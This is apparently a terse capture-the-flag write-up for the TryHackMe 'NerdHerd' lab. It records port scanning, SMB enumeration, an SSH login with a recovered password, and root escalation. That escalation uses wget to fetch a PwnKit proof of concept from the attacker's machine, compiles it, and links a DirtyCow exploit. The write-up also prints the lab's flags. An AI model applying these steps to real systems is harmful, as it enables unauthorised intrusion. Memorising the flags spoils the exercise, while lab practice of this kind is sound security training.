# NerdHerd 

> VOiD | Monday 21 February 2022 12:18:04 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.149.48



## Rustscan
```bash
Open 10.10.149.48:21
Open 10.10.149.48:22
Open 10.10.149.48:139
Open 10.10.149.48:1337
Open 10.10.149.48:445


```

## PORT 21 [ftp]
```bash
cat hellon3rd.txt                                    
all you need is in the leet


```

## PORT 1337
```bash
Owner Name                      : fijbxslz
vignere it with the youtube video : birdisthe gives : easypass

<!--
	these might help:
		Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
		cibartowski:hehegou<.jÇ].[ÝD
-->


```

## PORT 139 [smb]
```bash
smbclient -L 10.10.149.48  
Enter WORKGROUP\void's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	nerdherd_classified Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

smbclient \\\\10.10.149.48\\nerdherd_classified
Enter WORKGROUP\void's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED


 ============================ 
|    Users on 10.10.149.48    |
 ============================ 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck	Name: ChuckBartowski	Desc: 

user:[chuck] rid:[0x3e8]

smbclient \\\\10.10.149.48\\nerdherd_classified -U chuck                    130 ⨯
Enter WORKGROUP\chuck's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 11 01:29:53 2020
  ..                                  D        0  Thu Nov  5 20:44:40 2020
  secr3t.txt                          N      125  Fri Sep 11 01:29:53 2020

		8124856 blocks of size 1024. 3406708 blocks available
smb: \> get secr3t.txt 
getting file \secr3t.txt of size 125 as secr3t.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

```

## USER [chuck]
```bash
ssh chuck@10.10.149.48
th1s41ntmypa5s

chuck@nerdherd:~$ cat user.txt 
THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}


OS: Linux version 4.4.0-31-generic (buildd@lgw01-16) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2.1) ) #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016
THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}

https://raw.githubusercontent.com/kkamagui/linux-kernel-exploits/master/kernel-4.4.0-31-generic/CVE-2016-5195/naughtyc0w.c


wget http://10.8.253.221/cve-2021-4034-poc.c

chuck@nerdherd:~$ gcc cve-2021-4034-poc.c -o exploit


/opt/.root.txt:THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}

root@nerdherd:/# cat ~/.bash_history
THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}
```